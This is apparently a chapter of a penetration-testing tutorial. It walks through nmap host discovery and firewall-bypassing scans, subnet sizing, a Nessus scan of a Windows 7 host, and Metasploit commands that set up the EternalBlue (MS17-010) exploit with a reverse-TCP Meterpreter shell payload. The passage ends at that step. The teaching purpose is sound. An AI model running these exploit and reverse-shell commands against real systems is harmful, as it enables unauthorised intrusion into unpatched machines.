
We need to know if there is a client on the network that is running Windows 7. The user understands they are in danger because they are running an outdated version of Windows. In a matter of minutes, Windows 7 can be hacked! Microsoft stopped supporting Windows 7 in January 2020. Because Windows 7 is no longer maintained, attackers will flock to this version of the operating system in quest of flaws. The reason for this is that Microsoft will no longer offer security patches, which means that if an attacker discovers a hole in the system, it will remain susceptible indefinitely.

We will use a variety of networking tools to figure out how many hosts are on the network, what operating system they are running, how big the network is, and which ones are vulnerable. Knowing what parts of the network are susceptible and then applying security patches or upgrades will help to improve security. Keep in mind that not only the systems and equipment in your business are vulnerable but also the people!

This is certainly one of the most serious security threats one encounter. Your employees should go through a security awareness program to learn about the good and bad, as well as the dos and don’ts. You may also have employees that share consumer information outside of the workplace for financial advantage. Keep a watch out for any unusual conduct that could jeopardize the company’s operations.

# Identifying hosts

This section covers the various tools available for identifying hosts on a network. These programs will provide a user’s IP address, MAC address, open and closed ports, services, operating system, and other details. The following sections contain a list of Kali Linux tools that can be used to identify hosts on a network.

## Network mapping tools

The command-line interface of `Nmap` will be the center of our attention. Here are some alternative network mapping tools to consider:

*   `0trace`
*   `Angry IP scanner`
*   `hping2` and `hping3`
*   `lanmap` and `lanmap2`
*   `TCP traceroute`

You will learn how to use `Nmap` to identify hosts on a network in this tutorial. When it comes to network discovery or determining whether a network service, such as `Telnet`, `SSH`, or `FTP`, is running, these tools are by far my favorites. Let us get started!

1.  Open the Terminal.
2.  Press `Enter` after typing the following command:
    ```
    ifconfig
    ```
    In this case, our private IP address is `192.168.1.128`, as shown in **Figure 5.1**. Because our gateway is `192.168.1.1`, we will see how to scan the entire subnet next.
    ![](images/Figure-5.1.jpg)
    **Figure 5.1:** Ifconfig command
3.  Press `Enter` after typing the following command:
    ```
    nmap 192.168.X.0/24
    ```
    This command initiates a ping sweep on all hosts on the `192.168.1.1` through `192.168.1.254` range. You will notice some intriguing information in your output, such as open and closed ports, services, and the operating system they are using.
    We can detect multiple systems and devices on the local network, as shown in **Figure 5.2**:
    ![](images/Figure-5.2.jpg)
    **Figure 5.2:** nmap command
4.  If you have a firewall installed on your network, run the following command:
    ```
    nmap -PN 192.168.X.0/24
    ```
    All hosts will be treated as online, and host discovery will be skipped. It is used to get beyond standard firewall filters to see if the firewall is up and running, as shown in **Figure 5.3**:
    ![](images/Figure-5.3.jpg)
    **Figure 5.3:** nmap command_2

## Determining the network size

It is not difficult to figure out how big your network is. It will be a lot easier if you already have some networking experience. Let us walk through a few steps to figure out how big the network is and how many hosts we have.

### Determining the network size using Kali Linux

We will determine the network size in Kali Linux in this tutorial. To do so, follow the given steps:

1.  Open the Terminal.
2.  Press `Enter` after typing the following command:
    ```
    ifconfig | grep mask
    ```
    **Figure 5.4** is the output:
    ![](images/Figure-5.4.jpg)
    **Figure 5.4:** ifconfig command_2

To go to your network configuration, you will need to scroll up and down. In **Figure 5.4**, the subnet mask is `255.255.255.0`. If we do some subnetting math, we can figure out that this network might have somewhere between 1 and 254 hosts.

What does establishing the network size have to do with penetration testing, you might wonder? The penetration tester can estimate the number of hosts on a network by determining the network size. When the number of networks in a data center or college campus is known, this can make a penetration test easier.

## Detecting vulnerable hosts

This section is rather self-explanatory. If you know someone who does not update their system daily, they are certainly vulnerable to the most recent security risks. As of right now, Windows 7 is extremely insecure, especially if the user has not installed any updates or service packs. Let us see a vulnerability in Windows 7 in the upcoming example.

Let us look at the steps:

1.  Scanning the target for services in use, as shown in **Figure 5.5**:
    ![](images/Figure-5.5.jpg)
    **Figure 5.5:** nmap command_3
    OS detection, version detection, script scanning, and traceroute are all possible with this command.
2.  Use `Nessus` to scan for vulnerabilities. (If you are running `Nessus` for the first time, please note that you will need to register `Nessus` first.)
3.  We provided the IP address of the host we are going to scan for vulnerabilities in the following, as shown in **Figure 5.6**:
    ![](images/Figure-5.6.jpg)
    **Figure 5.6:** Nessus_1
4.  We are now ready to click Launch to begin our `Nessus` scan, as illustrated in **Figure 5.7**:
    ![](images/Figure-5.7.jpg)
    **Figure 5.7:** Nessus_2
5.  After the scan is completed, we must examine the report, as shown in **Figure 5.8**:
    ![](images/Figure-5.8.jpg)
    **Figure 5.8:** Nessus_3
6.  As you can see from our findings, there are various services that are vulnerable, as shown in **Figure 5.9**:
    ![](images/Figure-5.9.jpg)
    **Figure 5.9:** Nessus_4
    When you select one of them and look at the name of the plugin, you will see `MS17-010`. We will use this later to locate our exploit.
7.  Let us start looking for our exploit. Use the following command to start a fresh `Metasploit` console, and refer to **Figure 5.10**:
    ```
    msfconsole
    ```
    ![](images/Figure-5.10.jpg)
    **Figure 5.10:** msfconsole command
    <https://www.rapid7.com/products/metasploit/download.jsp> is where you can get the `Metasploit Framework`. H. D. Moore created the `Metasploit Framework` in 2003 as an open-source attack framework. It is used to break into systems and gadgets for the purpose of testing. It contains information for penetration testers, IDS signature developers, and exploit researchers.
8.  Type the following into your search engine to find our exploit:
    ```
    search ms17
    ```
    The result is shown in **Figure 5.11**:
    ![](images/Figure-5.11.jpg)
    **Figure 5.11:** msfconsole command_2
9.  Complete the following commands:
    *   `use exploit/windows/smb/ms17_010_eternalblue`: This command sets `Metasploit Framework` to use the exploit `ms17_010_eternalblue`
    *   `set RHOST 192.168.1.129`: This command sets the remote host to the user whom you are exploiting.
    *   `set PAYLOAD windows/x64/meterpreter/reverse_tcp`: This command sets the payload to `reverse_tcp` so that we can connect back to the host after the exploit was successful.
